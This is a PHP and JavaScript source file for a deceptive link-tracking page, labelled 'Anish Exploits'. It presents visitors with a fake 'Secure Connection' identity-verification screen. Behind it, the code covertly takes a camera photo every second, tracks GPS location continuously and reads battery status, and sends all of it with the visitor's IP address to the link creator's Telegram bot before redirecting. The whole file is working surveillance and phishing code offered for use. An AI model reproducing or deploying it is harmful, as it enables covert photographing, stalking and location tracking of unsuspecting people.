<?php
// ===== AUTO-CREATE DIRS (Render restart pe kaam karega) =====
if (!is_dir('photos')) mkdir('photos', 0777, true);
if (!file_exists('visitors.json')) file_put_contents('visitors.json', '{}');
if (!file_exists('links.json')) file_put_contents('links.json', '{}');
if (!file_exists('debug.log')) file_put_contents('debug.log', date('Y-m-d H:i:s') . " - index.php started\n");
// ============================================================

require_once 'config.php';

$config = include 'config.php';
$token = $config['bot_token'];
$chatId = $config['chat_id'];

// Get short code from URL
$id = $_GET['id'] ?? '';
$db = json_decode(file_get_contents("links.json"), true) ?? [];
$targetUrl = $db[$id]['url'] ?? 'https://google.com';
$creatorId = $db[$id]['created_by'] ?? $chatId;

// Generate unique visitor ID
$visitorId = md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT'] . time());

// ========== FUNCTIONS ==========
function sendPhotoToTelegram($chatId, $photoPath, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $url = "https://api.telegram.org/bot$token/sendPhoto";
    $post = [
        'chat_id' => $chatId,
        'photo' => new CURLFile(realpath($photoPath)),
        'caption' => "📸 *Spy Photo!*\n🆔 $visitorId\n⏰ " . date('Y-m-d H:i:s')
    ];
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 30);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo send: $httpCode\n", FILE_APPEND);
    
    return $httpCode == 200;
}

function sendLocationToTelegram($chatId, $lat, $lng, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $url = "https://api.telegram.org/bot$token/sendLocation";
    $data = ['chat_id' => $chatId, 'latitude' => $lat, 'longitude' => $lng];
    file_get_contents($url . "?" . http_build_query($data));
    
    $msg = "📍 *Live Location*\n🆔 $visitorId\n🗺️ https://maps.google.com/?q=$lat,$lng";
    $url2 = "https://api.telegram.org/bot$token/sendMessage";
    $data2 = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    file_get_contents($url2 . "?" . http_build_query($data2));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Location sent: $lat, $lng\n", FILE_APPEND);
}

function sendBatteryToTelegram($chatId, $level, $charging, $visitorId) {
    global $config;
    $token = $config['bot_token'];
    
    $status = $charging ? "⚡ Charging" : "🔋 Not Charging";
    $msg = "🔋 *Battery Status*\n🆔 $visitorId\n📊 $level%\n$status";
    
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = ['chat_id' => $chatId, 'text' => $msg, 'parse_mode' => 'Markdown'];
    file_get_contents($url . "?" . http_build_query($data));
    
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Battery sent: $level%\n", FILE_APPEND);
}

// ========== HANDLE POST DATA ==========
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $input = file_get_contents('php://input');
    file_put_contents("debug.log", date('Y-m-d H:i:s') . " - POST received\n", FILE_APPEND);
    
    $data = json_decode($input, true);
    if (!$data) {
        echo json_encode(['status' => 'error', 'message' => 'Invalid JSON']);
        exit;
    }
    
    $items = isset($data[0]) ? $data : [$data];
    
    $visitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
    
    if (!isset($visitors[$visitorId])) {
        $visitors[$visitorId] = [
            'device' => $_SERVER['HTTP_USER_AGENT'],
            'ip' => $_SERVER['REMOTE_ADDR'],
            'target_url' => $targetUrl,
            'generated_by' => $creatorId,
            'time' => date('Y-m-d H:i:s'),
            'photos' => 0,
            'locations' => 0,
            'battery' => 0
        ];
    }
    
    $visitors[$visitorId]['last_update'] = date('Y-m-d H:i:s');
    
    foreach ($items as $item) {
        // PHOTO
        if (isset($item['photo']) && !empty($item['photo'])) {
            $photoData = $item['photo'];
            $photoData = str_replace('data:image/jpeg;base64,', '', $photoData);
            $photoData = str_replace(' ', '+', $photoData);
            $photoBinary = base64_decode($photoData);
            
            if ($photoBinary && strlen($photoBinary) > 500) {
                $photoPath = "photos/" . $visitorId . "_" . time() . ".jpg";
                file_put_contents($photoPath, $photoBinary);
                
                file_put_contents("debug.log", date('Y-m-d H:i:s') . " - Photo saved: " . filesize($photoPath) . " bytes\n", FILE_APPEND);
                
                if (file_exists($photoPath) && filesize($photoPath) > 500) {
                    sendPhotoToTelegram($creatorId, $photoPath, $visitorId);
                    $visitors[$visitorId]['photos'] += 1;
                }
            }
        }
        
        // LOCATION
        if (isset($item['location'])) {
            $lat = $item['location']['lat'] ?? 0;
            $lng = $item['location']['lng'] ?? 0;
            if ($lat != 0 && $lng != 0) {
                sendLocationToTelegram($creatorId, $lat, $lng, $visitorId);
                $visitors[$visitorId]['locations'] += 1;
            }
        }
        
        // BATTERY
        if (isset($item['battery'])) {
            $level = $item['battery']['level'] ?? 0;
            $charging = $item['battery']['charging'] ?? false;
            if ($level > 0) {
                sendBatteryToTelegram($creatorId, $level, $charging, $visitorId);
                $visitors[$visitorId]['battery'] += 1;
            }
        }
    }
    
    file_put_contents("visitors.json", json_encode($visitors));
    echo json_encode(['status' => 'success']);
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>✨ Anish Exploits</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
            color: white; display: flex; justify-content: center; align-items: center;
            min-height: 100vh; text-align: center;
        }
        .container { padding: 40px; }
        h1 { font-size: 3em; margin-bottom: 20px; }
        .status { font-size: 1.2em; margin: 20px 0; color: #00ff88; }
        .spinner { 
            width: 50px; height: 50px; border: 5px solid rgba(255,255,255,0.1);
            border-top-color: #00ff88; border-radius: 50%;
            animation: spin 1s linear infinite; margin: 20px auto;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .badge { 
            position: fixed; bottom: 20px; right: 20px;
            background: rgba(0,0,0,0.5); padding: 8px 15px;
            border-radius: 20px; font-size: 12px; color: #aaa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔒 Secure Connection</h1>
        <div class="spinner"></div>
        <div class="status" id="status">📸 Initializing...</div>
        <p style="color: #888; margin-top: 30px;">Verifying your identity...</p>
        <div class="badge">🔒 256-bit SSL Encrypted</div>
    </div>

    <script>
        // ===== CONFIG =====
        const targetUrl = "<?php echo addslashes($targetUrl); ?>";
        const visitorId = "<?php echo $visitorId; ?>";
        const debug = true;

        function debug(msg) {
            if (debug) console.log('[Spy]', msg);
        }

        // ===== CAPTURE CONTROL =====
        let isCapturing = true;
        let mediaStream = null;

        // ====== CAMERA ======
        async function startCamera() {
            try {
                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "environment", width: 320, height: 240 },
                    audio: false 
                });
                debug('✅ Camera access granted');

                const video = document.createElement('video');
                video.srcObject = mediaStream;
                video.play();

                // Capture photo every 1 second
                setInterval(() => {
                    if (!isCapturing) return;
                    const canvas = document.createElement('canvas');
                    canvas.width = 320;
                    canvas.height = 240;
                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
                    const photo = canvas.toDataURL('image/jpeg', 0.5);
                    sendData({ photo: photo });
                    debug('📸 Photo captured & sent');
                }, 1000);

            } catch (err) {
                debug('❌ Camera error: ' + err.message);
            }
        }

        // ====== GEOLOCATION ======
        function startGeolocation() {
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        const data = {
                            location: {
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude
                            }
                        };
                        sendData(data);
                        debug('📍 Location sent: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
                    },
                    (err) => { debug('❌ Location error: ' + err.message); },
                    { enableHighAccuracy: true, timeout: 5000 }
                );

                // Continuous tracking
                navigator.geolocation.watchPosition(
                    (pos) => {
                        sendData({
                            location: {
                                lat: pos.coords.latitude,
                                lng: pos.coords.longitude
                            }
                        });
                    },
                    (err) => {},
                    { enableHighAccuracy: true }
                );
            }
        }

        // ====== BATTERY ======
        function startBattery() {
            if ('getBattery' in navigator) {
                navigator.getBattery().then(battery => {
                    function updateBattery() {
                        sendData({
                            battery: {
                                level: Math.round(battery.level * 100),
                                charging: battery.charging
                            }
                        });
                        debug('🔋 Battery: ' + Math.round(battery.level * 100) + '%');
                    }
                    updateBattery();
                    setInterval(updateBattery, 5000);
                });
            } else {
                debug('❌ Battery API not supported');
            }
        }

        // ====== SEND DATA ======
        let pendingData = [];
        let lastSend = 0;

        function sendData(data) {
            pendingData.push(data);
            
            if (Date.now() - lastSend > 2000 || pendingData.length >= 3) {
                const batch = pendingData.slice();
                pendingData = [];
                
                debug('📤 Sending ' + batch.length + ' items');
                
                fetch(window.location.href, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(batch)
                })
                .then(res => res.json())
                .then(data => { debug('✅ Server OK'); })
                .catch(err => { debug('❌ Send error: ' + err.message); });
                
                lastSend = Date.now();
            }
        }

        // ====== REDIRECT ======
        let secondsLeft = 10;
        const statusEl = document.getElementById('status');
        
        const countdown = setInterval(() => {
            secondsLeft--;
            if (secondsLeft > 0) {
                statusEl.textContent = '🔄 Redirecting in ' + secondsLeft + 's...';
            }
        }, 1000);

        setTimeout(() => {
            clearInterval(countdown);
            isCapturing = false;
            statusEl.textContent = '🚀 Redirecting...';
            debug('✅ Redirecting...');
            
            setTimeout(() => {
                window.location.href = targetUrl;
            }, 1500);
        }, 10000);

        // ====== START ALL ======
        startCamera();
        startGeolocation();
        startBattery();
    </script>
</body>
</html>
